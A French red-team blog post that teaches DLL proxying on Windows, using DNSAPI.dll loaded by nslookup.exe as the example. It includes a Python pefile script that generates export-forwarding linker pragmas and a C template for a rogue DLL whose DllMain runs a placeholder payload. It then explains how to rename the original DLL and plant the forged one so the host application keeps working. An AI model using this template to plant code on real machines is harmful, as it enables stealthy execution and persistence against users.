+++
author = "Sh0ckFR"
title = "Martin et le DLL Proxying de cristal"
date = "2022-05-16"
description = "Martin et le DLL Proxying de cristal"
tags = [
    "red-team",
]
+++

Bonjour à tous et à toutes, pour faire suite à mon article [Martine à la recherche de la DLL Hijacking perdue](/pages/martine-a-la-recherche-de-la-dll-hijacking-perdue/) je vous propose aujourd'hui un article sur le DLL Proxying.

![Sh0ckFR DLL Proxying](/images/martin-dll-proxying.jpg)

Comme vous vous en doutez, le gars au centre c'est Martin et il ne savait pas trop ce qu'il lui arrivait avec ce pouvoir entre les mains, ici c'est pareil.

Vous avez pu comprendre les mécanismes du DLL Hijacking dans mon précédent post, mais je n'avais pas évoqué un point important.

Effectivement, que se passe t'il si on redirige une fonction d'un programme sans pour autant rediriger les autres fonctions de celui-ci ? vous avez 4 heures.

En vrai c'est relativement simple, ça peut crash, du moins vous pouvez bloquer l'exécution d'un programme et exécuter votre charge utile sans attendre de retour mais cela rend l'application originale inutilisable.

Dans un contexte où l'application n'est pas vraiment nécessaire pour l'utilisateur, ça fonctionne relativement bien, mais imaginez bloquer une bibliothèque importante pour un programme de l'utilisateur, votre charge utile fonctionnera mais l'utilisateur ne pourra plus utiliser son application originale.

Mais alors comment faire ?

La réponse est simple, rediriger TOUTES les fonctions du programme original (donc faire un DLL hijacking sur toutes les fonctions connues).

Reprenons l'exemple dans le précédent post, vous aviez vu que `nslookup.exe` utilisait une librairie vulnérable au DLL Hijacking `DNSAPI.dll`, pour retrouver toutes nos fonctions il existe un programme :

http://www.nirsoft.net/utils/dllexp-x64.zip

On peut donc retrouver la table d'export via ce logiciel :

![Sh0ckFR DLL Proxying](/images/dll-proxying-1.png)

Et là magie, on retrouve notre fonction utilisée dans le précédent post `DnsQueryConfigAllocEx`

![Sh0ckFR DLL Proxying](/images/dll-proxying-2.png)

Une autre solution pour éviter d'être dépendant de notre programme `DLL Export Viewer` et d'utiliser la librairie `pefile` pour Python :

```python
import pefile

exported_functions = []
pe = pefile.PE('C:\\windows\\system32\\DNSAPI.dll')
for entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    func = entry.name.decode('utf-8')
    exported_functions.append(f'#pragma comment(linker,"/export:{func}=proxy.{func},@{entry.ordinal}")')

exported_functions = '\n'.join(exported_functions)
print(exported_functions)
```

Ce qui donne un résultat du genre :

![Sh0ckFR DLL Proxying](/images/dll-proxying-3.png)

On voit que toutes les fonctions de DNSAPI.dll devront être redirigées vers une DLL nommée `proxy.dll`.

Il n'y a plus qu'à copier les exports pour le linked afin que nous puissons créer une DLL `DNSAPI.dll` avec toutes les fonctions attendues par la DLL originale `DNSAPI.dll` :

```c
#pragma once
#pragma comment(linker,"/export:AdaptiveTimeout_ClearInterfaceSpecificConfiguration=proxy.AdaptiveTimeout_ClearInterfaceSpecificConfiguration,@1")
#pragma comment(linker,"/export:AdaptiveTimeout_ResetAdaptiveTimeout=proxy.AdaptiveTimeout_ResetAdaptiveTimeout,@2")
#pragma comment(linker,"/export:AddRefQueryBlobEx=proxy.AddRefQueryBlobEx,@3")
#pragma comment(linker,"/export:BreakRecordsIntoBlob=proxy.BreakRecordsIntoBlob,@4")
#pragma comment(linker,"/export:Coalesce_UpdateNetVersion=proxy.Coalesce_UpdateNetVersion,@5")
#pragma comment(linker,"/export:CombineRecordsInBlob=proxy.CombineRecordsInBlob,@6")
#pragma comment(linker,"/export:DeRefQueryBlobEx=proxy.DeRefQueryBlobEx,@7")
...

int Main()
{
    // Your payload code.
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Main();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Il suffit ensuite de renommer la DLL originale `DNSAPI.dll` en `proxy.dll` et de copier notre nouvelle librairie `DNSAPI.dll` dans le même répertoire que le programme original et vous avez donc comme résultat un DLL Proxying parfait qui ne fera pas planter l'application originale.

Bien entendu, j'ai implémenté l'automatisation du DLL Proxying dans [DLLirant](https://github.com/Sh0ckFR/DLLirant) via l'argument `--proxydll` :

```python
python3 DLLirant.py -p "C:\THEFULLPATH\VulnerableDLL.dll"
```

## Crédits

itm4n - https://itm4n.github.io/dll-proxying/